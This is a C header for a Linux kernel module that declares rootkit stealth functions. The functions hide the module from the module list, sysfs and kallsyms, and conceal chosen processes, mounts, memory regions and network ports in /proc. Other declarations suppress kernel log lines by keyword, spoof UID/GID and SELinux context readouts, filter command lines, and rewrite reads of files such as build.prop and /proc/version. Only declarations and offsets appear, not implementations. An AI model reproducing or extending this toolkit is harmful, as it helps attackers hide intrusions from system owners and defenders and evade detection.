/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NEVERC_KRT_HIDE_H
#define NEVERC_KRT_HIDE_H

#include <linux/types.h>
#include <nvk_rt.h>
#include <linux/compiler.h>
#include <linux/list.h>
#include <linux/kallsyms.h>
#include <nvkmod_version.h>
#include <nvk_hook.h>

typedef void (*neverc_krt_mutex_lock_fn)(void *);
typedef void (*neverc_krt_mutex_unlock_fn)(void *);
typedef void *(*neverc_krt_find_module_fn)(const char *name);
typedef void  (*neverc_krt_kobject_del_fn)(void *kobj);
typedef void  (*neverc_krt_kobject_put_fn)(void *kobj);

struct neverc_krt_hide_state {
	struct list_head *saved_next;
	struct list_head *saved_prev;
	int               hidden;
	struct neverc_krt_hook   find_module_hook;
	neverc_krt_find_module_fn orig_find_module;
	const char       *module_name;
	int               sysfs_removed;
	int               kallsyms_filtered;
	void             *saved_kobj;
	struct neverc_krt_hook   seq_show_hook;
	int               seq_show_hooked;
};

NEVERC_KRT_RT_VAR neverc_krt_mutex_lock_fn   _neverc_krt_hide_mutex_lock;
NEVERC_KRT_RT_VAR neverc_krt_mutex_unlock_fn _neverc_krt_hide_mutex_unlock;
NEVERC_KRT_RT_VAR void               *_neverc_krt_module_mutex;
NEVERC_KRT_RT_VAR neverc_krt_kobject_del_fn  _neverc_krt_kobject_del;
NEVERC_KRT_RT_VAR neverc_krt_kobject_put_fn  _neverc_krt_kobject_put;
NEVERC_KRT_RT_VAR int                 _neverc_krt_hide_inited;

int neverc_krt_hide_init(void);


static __always_inline struct list_head *
_neverc_krt_get_mod_list(struct neverc_krt_this_module *mod)
{
	return (struct list_head *)((char *)mod + NEVERC_KRT_OFF_LIST);
}

void neverc_krt_mod_hide(struct neverc_krt_hide_state *state,
			 struct neverc_krt_this_module *mod);


void neverc_krt_mod_show(struct neverc_krt_hide_state *state,
			 struct neverc_krt_this_module *mod);


static __always_inline int neverc_krt_mod_is_hidden(struct neverc_krt_hide_state *state)
{
	return state->hidden;
}

void neverc_krt_mod_sysfs_remove(struct neverc_krt_hide_state *state,
				 struct neverc_krt_this_module *mod);


typedef int (*neverc_krt_mod_seq_show_fn)(void *seq, void *v);
NEVERC_KRT_RT_VAR neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
NEVERC_KRT_RT_VAR const char *_neverc_krt_hide_target_name;

int _neverc_krt_str_starts_with(const char *str, const char *prefix);


int _neverc_krt_mod_seq_show_filter(void *seq, void *v);


int neverc_krt_mod_proc_filter(struct neverc_krt_hide_state *state,
			       const char *module_name);


typedef int (*neverc_krt_mod_addr_fn)(unsigned long addr);
NEVERC_KRT_RT_VAR neverc_krt_mod_addr_fn _neverc_krt_orig_mod_text_addr;
NEVERC_KRT_RT_VAR struct neverc_krt_hook _neverc_krt_ks_hook;
NEVERC_KRT_RT_VAR int _neverc_krt_ks_hooked;
NEVERC_KRT_RT_VAR unsigned long _neverc_krt_hide_mod_start;
NEVERC_KRT_RT_VAR unsigned long _neverc_krt_hide_mod_end;

int _neverc_krt_mod_text_addr_filter(unsigned long addr);


int neverc_krt_mod_kallsyms_filter(struct neverc_krt_hide_state *state,
				   const char *module_name);


void neverc_krt_mod_full_hide(struct neverc_krt_hide_state *state,
			      struct neverc_krt_this_module *mod,
			      const char *module_name);


void _neverc_krt_hide_cleanup(struct neverc_krt_hide_state *state,
			      struct neverc_krt_this_module *mod);


#define NEVERC_KRT_HIDE_INIT_STATE { .saved_next = 0, .saved_prev = 0,  \
			      .hidden = 0, .module_name = 0,     \
			      .sysfs_removed = 0,                 \
			      .kallsyms_filtered = 0,             \
			      .saved_kobj = 0,                    \
			      .seq_show_hooked = 0 }


/* --- /proc/pid hiding --- */

typedef int (*neverc_krt_proc_readdir_fn)(void *file, void *ctx);
typedef int (*neverc_krt_filldir_fn)(void *ctx, const char *name, int namlen,
			      long long offset, u64 ino, unsigned int type);

#define NEVERC_KRT_HIDE_PID_MAX 32

struct neverc_krt_pid_hide_state {
	int              pids[NEVERC_KRT_HIDE_PID_MAX];
	int              count;
	struct neverc_krt_hook_ctx ctx_hook;
	int              active;
};

NEVERC_KRT_RT_VAR struct neverc_krt_pid_hide_state _neverc_krt_pid_state;

int _neverc_krt_atoi(const char *s, int len);


int _neverc_krt_pid_is_hidden(int pid);


#define _NEVERC_KRT_PID_ACTOR_SLOTS 8

struct _neverc_krt_pid_actor_slot {
	volatile unsigned long task;
	neverc_krt_filldir_fn orig;
};

NEVERC_KRT_RT_VAR struct _neverc_krt_pid_actor_slot
	_neverc_krt_pid_actors[_NEVERC_KRT_PID_ACTOR_SLOTS];

int _neverc_krt_pid_actor_acquire(neverc_krt_filldir_fn orig);


void _neverc_krt_pid_actor_release(void);


neverc_krt_filldir_fn _neverc_krt_pid_actor_get_orig(void);


int _neverc_krt_pid_filldir_wrap(void *ctx, const char *name, int namlen,
				 long long offset, u64 ino, unsigned int type);


void _neverc_krt_pid_readdir_ctx(neverc_krt_reg_ctx *ctx);


int neverc_krt_pid_hide_add(int pid);


int neverc_krt_pid_hide_remove(int pid);


int neverc_krt_pid_hide_install(void);


static __always_inline int neverc_krt_pid_should_hide(int pid)
{
	if (!_neverc_krt_pid_state.active) return 0;
	return _neverc_krt_pid_is_hidden(pid);
}

void neverc_krt_pid_hide_cleanup(void);



/* --- /proc/mounts path filter --- */

typedef int (*neverc_krt_mounts_show_fn)(void *seq, void *v);
NEVERC_KRT_RT_VAR struct neverc_krt_hook _neverc_krt_mounts_hook;

#define NEVERC_KRT_MOUNT_FILTER_MAX 8
#define NEVERC_KRT_MOUNT_PATH_MAX   64

struct neverc_krt_mount_filter {
	char paths[NEVERC_KRT_MOUNT_FILTER_MAX][NEVERC_KRT_MOUNT_PATH_MAX];
	int  count;
	int  active;
};

NEVERC_KRT_RT_VAR struct neverc_krt_mount_filter _neverc_krt_mnt_filter;

int neverc_krt_mount_filter_add(const char *path);


NEVERC_KRT_RT_VAR neverc_krt_mounts_show_fn _neverc_krt_orig_mounts_show_fn;

int _neverc_krt_mnt_path_match(const char *haystack);


int _neverc_krt_mounts_show_filter(void *seq, void *v);


int neverc_krt_mount_filter_install(void);


void neverc_krt_mount_filter_cleanup(void);



/* --- /proc/pid/maps module region filter --- */

#define NEVERC_KRT_MAPS_FILTER_MAX 4

struct neverc_krt_maps_filter_region {
	unsigned long start;
	unsigned long end;
};

NEVERC_KRT_RT_VAR struct neverc_krt_maps_filter_region _neverc_krt_maps_regions[NEVERC_KRT_MAPS_FILTER_MAX];
NEVERC_KRT_RT_VAR int _neverc_krt_maps_region_count;

int neverc_krt_maps_filter_add(unsigned long start, unsigned long end);


static __always_inline int neverc_krt_maps_should_hide(unsigned long addr)
{
	int i;
	for (i = 0; i < _neverc_krt_maps_region_count; i++) {
		if (addr >= _neverc_krt_maps_regions[i].start &&
		    addr < _neverc_krt_maps_regions[i].end)
			return 1;
	}
	return 0;
}

void neverc_krt_maps_filter_clear(void);


void neverc_krt_maps_filter_add_self(void);


void neverc_krt_mod_wipe_modinfo(struct neverc_krt_this_module *mod);



typedef int (*neverc_krt_vmalloc_show_fn)(void *seq, void *v);
NEVERC_KRT_RT_VAR struct neverc_krt_hook _neverc_krt_vmalloc_hook;
NEVERC_KRT_RT_VAR neverc_krt_vmalloc_show_fn _neverc_krt_orig_vmalloc_show;
NEVERC_KRT_RT_VAR int _neverc_krt_vmalloc_hooked;
NEVERC_KRT_RT_VAR unsigned long _neverc_krt_vmalloc_hide_start;
NEVERC_KRT_RT_VAR unsigned long _neverc_krt_vmalloc_hide_end;

struct _neverc_krt_vmap_area {
	unsigned long va_start;
	unsigned long va_end;
};

int _neverc_krt_vmalloc_show_filter(void *seq, void *v);


void *_neverc_krt_resolve_vmalloc_s_show(void);


int neverc_krt_mod_vmalloc_filter(void);



/* --- dmesg / kmsg log suppression --- */

NEVERC_KRT_RT_VAR struct neverc_krt_hook_ctx _neverc_krt_dmesg_ctx_hook;
NEVERC_KRT_RT_VAR int _neverc_krt_dmesg_hooked;

#define NEVERC_KRT_DMESG_FILTER_MAX 4
#define NEVERC_KRT_DMESG_FILTER_LEN 32

NEVERC_KRT_RT_VAR char _neverc_krt_dmesg_filters[NEVERC_KRT_DMESG_FILTER_MAX][NEVERC_KRT_DMESG_FILTER_LEN];
NEVERC_KRT_RT_VAR int _neverc_krt_dmesg_filter_cnt;

int neverc_krt_dmesg_filter_add(const char *keyword);


int _neverc_krt_str_contains(const char *haystack, const char *needle);


int _neverc_krt_dmesg_should_suppress(const char *text);


__attribute__((__noinline__)) long _neverc_krt_dmesg_ret0(void);


NEVERC_KRT_RT_VAR int _neverc_krt_dmesg_fmt_reg;

void _neverc_krt_dmesg_ctx_handler(neverc_krt_reg_ctx *ctx);


int neverc_krt_dmesg_suppress_install(const char *module_name);


void neverc_krt_dmesg_suppress_cleanup(void);



/* --- /proc/kmsg read filter --- */

typedef long (*neverc_krt_kmsg_read_fn)(void *filp, char __user *buf,
				 size_t count, long long *ppos);
NEVERC_KRT_RT_VAR struct neverc_krt_hook _neverc_krt_kmsg_read_hook;
NEVERC_KRT_RT_VAR neverc_krt_kmsg_read_fn _neverc_krt_orig_kmsg_read;
NEVERC_KRT_RT_VAR int _neverc_krt_kmsg_read_hooked;

long _neverc_krt_kmsg_read_filter(void *filp, char __user *buf,
				  size_t count, long long *ppos);


int neverc_krt_kmsg_read_filter_install(void);


void neverc_krt_kmsg_read_filter_cleanup(void);


/* --- /proc/pid/status UID spoofing --- */

typedef long (*neverc_krt_proc_status_show_fn)(void *seq, void *v);
NEVERC_KRT_RT_VAR struct neverc_krt_hook _neverc_krt_proc_status_hook;
NEVERC_KRT_RT_VAR neverc_krt_proc_status_show_fn _neverc_krt_orig_proc_status;
NEVERC_KRT_RT_VAR int _neverc_krt_proc_status_hooked;

NEVERC_KRT_RT_VAR u32 _neverc_krt_status_spoof_uid;
NEVERC_KRT_RT_VAR u32 _neverc_krt_status_spoof_gid;

typedef int (*neverc_krt_seq_printf_fn)(void *seq, const char *fmt, ...);
NEVERC_KRT_RT_VAR neverc_krt_seq_printf_fn _neverc_krt_seq_printf_fn;

void _neverc_krt_status_ctx_handler(neverc_krt_reg_ctx *ctx);


int neverc_krt_proc_status_filter_install(u32 fake_uid, u32 fake_gid);


void neverc_krt_proc_status_filter_cleanup(void);



/* --- /proc/pid/attr/* SELinux context filter --- */

typedef long (*neverc_krt_proc_attr_read_fn)(void *file, char __user *buf,
				      size_t count, long long *ppos);
NEVERC_KRT_RT_VAR struct neverc_krt_hook _neverc_krt_proc_attr_hook;
NEVERC_KRT_RT_VAR neverc_krt_proc_attr_read_fn _neverc_krt_orig_proc_attr_read;
NEVERC_KRT_RT_VAR int _neverc_krt_proc_attr_hooked;

NEVERC_KRT_RT_VAR const char *_neverc_krt_attr_fake_ctx;

long _neverc_krt_proc_attr_read_filter(void *file, char __user *buf,
					size_t count, long long *ppos);


int neverc_krt_proc_attr_filter_install(const char *fake_context);


void neverc_krt_proc_attr_filter_cleanup(void);



/* --- /proc/net/tcp{,6} port hiding --- */

#define NEVERC_KRT_NET_HIDE_PORT_MAX 16

struct neverc_krt_net_hide_state {
	u16 ports[NEVERC_KRT_NET_HIDE_PORT_MAX];
	int count;
	struct neverc_krt_hook tcp4_hook;
	struct neverc_krt_hook tcp6_hook;
	struct neverc_krt_hook udp4_hook;
	struct neverc_krt_hook udp6_hook;
	int active;
};

NEVERC_KRT_RT_VAR struct neverc_krt_net_hide_state _neverc_krt_net_hide;

typedef int (*neverc_krt_net_seq_show_fn)(void *seq, void *v);
NEVERC_KRT_RT_VAR neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp4_show;
NEVERC_KRT_RT_VAR neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp6_show;
NEVERC_KRT_RT_VAR neverc_krt_net_seq_show_fn _neverc_krt_orig_udp4_show;
NEVERC_KRT_RT_VAR neverc_krt_net_seq_show_fn _neverc_krt_orig_udp6_show;

int neverc_krt_net_hide_add_port(u16 port);


int _neverc_krt_net_port_hidden(u16 port);


#define _NEVERC_KRT_SKC_DPORT_OFF 12
#define _NEVERC_KRT_SKC_NUM_OFF   14

int _neverc_krt_extract_ports(void *sk, u16 *sport, u16 *dport);


int _neverc_krt_net_filter_show(void *seq, void *v,
				neverc_krt_net_seq_show_fn orig);


int _neverc_krt_tcp4_show_filter(void *seq, void *v);


int _neverc_krt_tcp6_show_filter(void *seq, void *v);


int _neverc_krt_udp4_show_filter(void *seq, void *v);


int _neverc_krt_udp6_show_filter(void *seq, void *v);


int neverc_krt_net_hide_install(void);


void neverc_krt_net_hide_cleanup(void);



/* --- /proc/pid/cmdline content filter --- */

typedef long (*neverc_krt_cmdline_read_fn)(void *file, char __user *buf,
				    size_t count, long long *ppos);
NEVERC_KRT_RT_VAR struct neverc_krt_hook _neverc_krt_cmdline_hook;
NEVERC_KRT_RT_VAR neverc_krt_cmdline_read_fn _neverc_krt_orig_cmdline_read;
NEVERC_KRT_RT_VAR int _neverc_krt_cmdline_hooked;

#define NEVERC_KRT_CMDLINE_FILTER_MAX 4
#define NEVERC_KRT_CMDLINE_FILTER_LEN 32

NEVERC_KRT_RT_VAR char _neverc_krt_cmdline_filters[NEVERC_KRT_CMDLINE_FILTER_MAX][NEVERC_KRT_CMDLINE_FILTER_LEN];
NEVERC_KRT_RT_VAR int _neverc_krt_cmdline_filter_cnt;

int neverc_krt_cmdline_filter_add(const char *keyword);


long _neverc_krt_cmdline_read_filter(void *file, char __user *buf,
				     size_t count, long long *ppos);


int neverc_krt_cmdline_filter_install(void);


void neverc_krt_cmdline_filter_cleanup(void);



/* --- File read interception (build.prop, /proc/version spoofing) --- */

typedef long (*neverc_krt_vfs_read_fn)(void *file, char __user *buf,
				size_t count, long long *pos);

NEVERC_KRT_RT_VAR struct neverc_krt_hook _neverc_krt_vfs_read_hook;
NEVERC_KRT_RT_VAR neverc_krt_vfs_read_fn _neverc_krt_orig_vfs_read;
NEVERC_KRT_RT_VAR int _neverc_krt_vfs_read_hooked;

#define NEVERC_KRT_FILE_SPOOF_MAX 4
#define NEVERC_KRT_FILE_PATH_MAX  64
#define NEVERC_KRT_FILE_SPOOF_MAX_LEN 128

struct neverc_krt_file_spoof_entry {
	char path[NEVERC_KRT_FILE_PATH_MAX];
	char search[NEVERC_KRT_FILE_SPOOF_MAX_LEN];
	char replace[NEVERC_KRT_FILE_SPOOF_MAX_LEN];
	int  search_len;
	int  replace_len;
};

NEVERC_KRT_RT_VAR struct neverc_krt_file_spoof_entry _neverc_krt_file_spoofs[NEVERC_KRT_FILE_SPOOF_MAX];
NEVERC_KRT_RT_VAR int _neverc_krt_file_spoof_cnt;

int neverc_krt_file_spoof_add(const char *path,
			      const char *search, int slen,
			      const char *replace, int rlen);


#define _NEVERC_KRT_FILE_DENTRY_OFF 0x18
#define _NEVERC_KRT_DENTRY_DNAME_NAME_OFF 0x28

int _neverc_krt_file_match_path(void *file, const char *target);


long _neverc_krt_vfs_read_filter(void *file, char __user *buf,
				 size_t count, long long *pos);


int neverc_krt_file_spoof_install(void);


void neverc_krt_file_spoof_cleanup(void);


#endif /* NEVERC_KRT_HIDE_H */
